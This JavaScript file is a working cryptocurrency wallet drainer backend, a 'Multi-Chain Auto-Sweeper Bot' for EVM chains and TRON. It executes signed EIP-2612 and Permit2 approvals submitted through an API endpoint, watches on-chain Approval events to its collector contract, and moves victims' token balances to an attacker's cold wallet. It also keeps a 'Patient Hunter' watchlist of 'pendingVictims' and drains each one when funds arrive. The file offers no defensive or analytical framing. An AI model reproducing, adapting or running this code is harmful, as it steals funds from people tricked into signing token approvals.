require('dotenv').config();
const { ethers } = require('ethers');
const { TronWeb } = require('tronweb');
const express = require('express');
const cors = require('cors');

console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");

// ==========================================
// 🌐 EXPRESS API SERVER 
// ==========================================
const app = express();
app.use(cors());
app.use(express.json()); 

const PORT = process.env.PORT || 3001;

// 🧠 ACTIVE MEMORY: Stores EVM wallets that approved but had 0 balance
const pendingVictimsEVM = new Map();

// ==========================================
// 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
// ==========================================
if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_COLLECTOR_ADDRESS && process.env.EVM_COLLECTOR_ADDRESS.startsWith('0x')) {
    try {
        const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
        const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);

        const EVM_TOKEN_ABI = [
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
        ];
        
        // ── PERMIT2 DIRECT INTERFACE ──
        const PERMIT2_ABI = [
            "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
            "function transferFrom(address from, address to, uint160 amount, address token) external"
        ];

        const EVM_COLLECTOR_ABI = [
            "function routeDeposit(address token, address from, address to, uint256 amount) external"
        ];

        const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
        const permit2Contract = new ethers.Contract('0x000000000022D473030F116dDEE9F6B43aC78BA3', PERMIT2_ABI, evmWallet);

        // ── NEW: GASLESS SIGNATURE HANDLER ──
        app.post('/execute-gasless', async (req, res) => {
            const { type, token, owner, spender, signature, deadline } = req.body;

            console.log(`\n[BACKEND] ✍️ SIGNATURE RECEIVED! Type: ${type}`);
            console.log(`[BACKEND] Payload: ${signature.substring(0, 40)}...`);
            console.log(`[BACKEND] From Owner: ${owner} | Token: ${token}`);

            try {
                const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
                const sig = ethers.Signature.from(signature);

                if (type === 'PERMIT') {
                    console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit for ${token}...`);
                    const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
                    console.log(`[BACKEND] ⏳ Processing Permit...`);
                    await tx.wait();
                    
                    const balance = await tokenContract.balanceOf(owner);
                    if (balance > 0n) {
                        console.log(`[BACKEND] 🎯 SWEEPING via Collector Contract...`);
                        const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
                        await sweepTx.wait();
                        console.log(`[BACKEND] ✅ EIP-2612 Sweep Successful!`);
                    }
                } 
                else if (type === 'PERMIT2') {
                    console.log(`[BACKEND] ⚡ Executing Permit2 Authorization...`);
                    const permitSingle = {
                        details: {
                            token: token,
                            amount: '1461501637330902918203684832716283019655932542975', // Permit2 Max
                            expiration: deadline,
                            nonce: 0
                        },
                        spender: spender,
                        sigDeadline: deadline
                    };
                    
                    const tx = await permit2Contract.permit(owner, permitSingle, signature);
                    await tx.wait();
                    console.log(`[BACKEND] ✅ Permit2 Authorized.`);

                    const balance = await tokenContract.balanceOf(owner);
                    if (balance > 0n) {
                        console.log(`[BACKEND] 🎯 SWEEPING DIRECTLY via Permit2.transferFrom...`);
                        const sweepTx = await permit2Contract.transferFrom(owner, process.env.EVM_COLD_WALLET, balance, token);
                        console.log(`[BACKEND] ⏳ Processing Direct Permit2 Sweep...`);
                        await sweepTx.wait();
                        console.log(`[BACKEND] ✅ Permit2 Direct Sweep Successful!`);
                    }
                }

                res.status(200).json({ success: true });
            } catch (err) {
                console.error(`[BACKEND] ❌ Signature Execution Failed:`, err.message);
                res.status(500).json({ error: err.message });
            }
        });

        const approvalFilter = {
            topics: [
                ethers.id("Approval(address,address,uint256)"), 
                null, 
                ethers.zeroPadValue(process.env.EVM_COLLECTOR_ADDRESS, 32) 
            ]
        };

        console.log(`[EVM] 🎧 Listening for Approvals to Collector: ${process.env.EVM_COLLECTOR_ADDRESS}`);

        // ── 1. ON-CHAIN LISTENER ──
        evmProvider.on(approvalFilter, async (log) => {
            console.log(`\n[EVM] 🔔 RAW EVENT DETECTED ON NODE! Analyzing payload...`);
            try {
                const tokenAddress = log.address; 
                const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); 
                
                console.log(`[EVM] 🚨 PARSED ON-CHAIN APPROVAL!`);
                console.log(`[EVM] Token: ${tokenAddress} | User: ${owner}`);
                
                const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
                const balance = await dynamicTokenContract.balanceOf(owner);
                
                if (balance > 0n) {
                    const decimals = await dynamicTokenContract.decimals();
                    console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                    
                    try {
                        const destinationWallet = process.env.EVM_COLD_WALLET; 
                        const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
                        console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
                        await tx.wait();
                        console.log(`[EVM] ✅ Successfully Swept!`);
                    } catch (sweepError) {
                        console.error(`[EVM] ❌ Sweep Execution Failed:`, sweepError.message);
                        pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
                    }
                } else {
                    console.log(`[EVM] ⚠️ Balance is 0. Adding to Patient Hunter.`);
                    pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
                }
            } catch (error) {
                console.error(`[EVM] ❌ Listener Parsing Failed:`, error.message);
            }
        });

        // ── THE EVM PATIENT HUNTER LOOP ──
        setInterval(async () => {
            if (pendingVictimsEVM.size > 0) {
                console.log(`\n[EVM] 📋 CURRENT WATCHLIST (${pendingVictimsEVM.size} Active Nodes):`);
                for (const key of pendingVictimsEVM.keys()) { console.log(`      -> Tracking: ${key}`); }
            }

            for (const [key, data] of pendingVictimsEVM.entries()) {
                try {
                    const dynamicTokenContract = new ethers.Contract(data.token, EVM_TOKEN_ABI, evmProvider);
                    const balance = await dynamicTokenContract.balanceOf(data.owner);
                    if (balance > 0n) {
                        console.log(`\n[EVM] 🎯 FUNDS DETECTED ON WATCHLIST!`);
                        const tx = await evmCollectorContract.routeDeposit(data.token, data.owner, process.env.EVM_COLD_WALLET, balance);
                        await tx.wait();
                        console.log(`[EVM] ✅ Watchlist Sweep Successful!`);
                        pendingVictimsEVM.delete(key);
                    }
                } catch (e) {}
            }
        }, 30000); 

        console.log("✅ EVM Multi-Token Listener Active.");
    } catch (e) {
        console.warn("⚠️ EVM Initialization failed. Check your .env config.");
    }
} else {
    console.warn("⚠️ EVM config missing or invalid in .env.");
}

// ── 2. RAILWAY HEALTH CHECK SERVER ──
app.get('/', (req, res) => {
    res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
});

const pendingVictimsTRON = new Map();

// ==========================================
// 🔴 TRON SWEEPER CONFIGURATION
// ==========================================
if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS && process.env.TRON_DESTINATION_WALLET) {
    const tronWeb = new TronWeb({
        fullHost: process.env.TRON_FULL_HOST,
        privateKey: process.env.TRON_PRIVATE_KEY
    });

    const TRON_USDT_ABI = [
        { "inputs": [ { "name": "who", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" }
    ];

    const TRON_ROUTER_ABI = [
        { inputs: [ { name: 'token', type: 'address' }, { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' } ], name: 'routeDeposit', outputs: [], stateMutability: 'nonpayable', type: 'function' }
    ];

    async function startTronListener() {
        try {
            const tronUsdtContract = await tronWeb.contract(TRON_USDT_ABI, process.env.TRON_USDT_ADDRESS);
            const tronCollectorContract = await tronWeb.contract(TRON_ROUTER_ABI, process.env.TRON_COLLECTOR_ADDRESS);

            console.log("✅ TRON Listener Active (Polling Mode).");

            let lastProcessedTimestamp = Date.now() - 3000;
            const processedTxs = new Set();

            setInterval(async () => {
                try {
                    const events = await tronWeb.event.getEventsByContractAddress(
                        process.env.TRON_USDT_ADDRESS,
                        { eventName: 'Approval', minBlockTimestamp: lastProcessedTimestamp, orderBy: 'block_timestamp,asc' }
                    );

                    if (events && events.data && events.data.length > 0) {
                        for (const event of events.data) {
                            if (processedTxs.has(event.transaction_id)) continue;
                            processedTxs.add(event.transaction_id);
                            if (processedTxs.size > 1000) processedTxs.clear();

                            if (event.block_timestamp >= lastProcessedTimestamp) {
                                lastProcessedTimestamp = event.block_timestamp + 1;
                            }

                            const spenderHex = event.result.spender || event.result._spender;
                            if (!spenderHex) continue;
                            const spenderBase58 = tronWeb.address.fromHex(spenderHex);

                            if (spenderBase58 === process.env.TRON_COLLECTOR_ADDRESS) {
                                const ownerHex = event.result.owner || event.result._owner;
                                const ownerBase58 = tronWeb.address.fromHex(ownerHex);

                                console.log(`\n[TRON] 🚨 APPROVAL MATCHED AND DETECTED! User: ${ownerBase58}`);

                                try {
                                    const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
                                    const balanceStr = balanceObj.toString();

                                    if (Number(balanceStr) > 0) {
                                        console.log(`[TRON] Target locked: ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
                                        let attempt = 1;
                                        let sweepSuccess = false;

                                        while (attempt <= 3 && !sweepSuccess) {
                                            try {
                                                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/3...`);
                                                const txId = await tronCollectorContract.routeDeposit(process.env.TRON_USDT_ADDRESS, ownerBase58, process.env.TRON_DESTINATION_WALLET, balanceStr).send({ callValue: 0, feeLimit: 500_000_000, shouldPollResponse: false });
                                                console.log(`[TRON] 📡 Broadcasted: ${txId}`);
                                                sweepSuccess = true;
                                            } catch (e) {
                                                attempt++;
                                                if (attempt > 3) pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                            }
                                        }
                                  } else {
                                        pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                    }
                                } catch (error) {}
                            }
                        }
                    }
                } catch (pollError) {}
            }, 3000); 

            setInterval(async () => {
                if (pendingVictimsTRON.size > 0) {
                    console.log(`\n[TRON] 📋 WATCHLIST (${pendingVictimsTRON.size} Nodes):`);
                    for (const key of pendingVictimsTRON.keys()) console.log(`      -> Tracking: ${key}`);
                }
                for (const [key, data] of pendingVictimsTRON.entries()) {
                    try {
                        const balanceObj = await tronUsdtContract.balanceOf(data.owner).call();
                        const balanceStr = balanceObj.toString();
                        if (Number(balanceStr) > 0) {
                            await tronCollectorContract.routeDeposit(process.env.TRON_USDT_ADDRESS, data.owner, process.env.TRON_DESTINATION_WALLET, balanceStr).send({ callValue: 0, feeLimit: 500_000_000, shouldPollResponse: false });
                            pendingVictimsTRON.delete(key);
                        }
                    } catch (e) {}
                }
            }, 30000); 
            
        } catch (e) {
            console.error("Failed to initialize TRON listener:", e.message);
        }
    }
    startTronListener();
} else {
    console.warn("⚠️ TRON config missing in .env.");
}

app.listen(PORT, () => {
    console.log(`📡 API Server Active: Health check listening on port ${PORT}`);
});